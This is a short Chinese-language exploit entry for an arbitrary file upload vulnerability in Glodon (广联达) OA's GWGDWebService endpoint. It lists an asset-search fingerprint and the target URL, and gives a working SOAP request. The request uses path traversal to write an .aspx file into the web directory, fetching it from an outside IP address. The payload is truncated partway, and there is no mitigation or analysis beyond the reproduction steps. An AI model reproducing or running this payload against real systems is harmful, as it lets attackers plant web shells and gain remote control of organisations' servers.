# 广联达OAGWGDWebService存在任意文件上传漏洞

- **系统**：广联达　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="广联达 OA"`
- **请求**：`POST /GB/LK/ArchiveManagement/Js/GWGDWebService.asmx HTTP/1.1`

**请求体 / payload**
```
1. 新建`stc.aspx`文件上传到服务器启动web服务
2. 上传文件
Host:
Content-Type: text/xml; charset=utf-8
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:GetGWGDData>
<!--Optional:-->
<tem:data>
<root>
<GWINFO>
<公文标题>1</公文标题>
<拟稿人>拟稿人</拟稿人>
<主送单位>主送单位</主送单位>
<主题词>主题词</主题词>
<印发份数>1</印发份数>
<签发日期>2022-12-07</签发日期>
</GWINFO>
<aa>
<FileName>./../../../../../../../applications/gtp-default/Web/Common/768a9b.aspx</FileName>
<DownLoadURL>http://172.245.154.22:9999/stc.aspx</DownLoadURL>
</aa>
</root>
</tem:data>
</tem:GetGWGDDa…（脚本共 669 字，完整版见原文）
```

**其他**
- 广联达OA GWGDWebService存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 广联达办公OA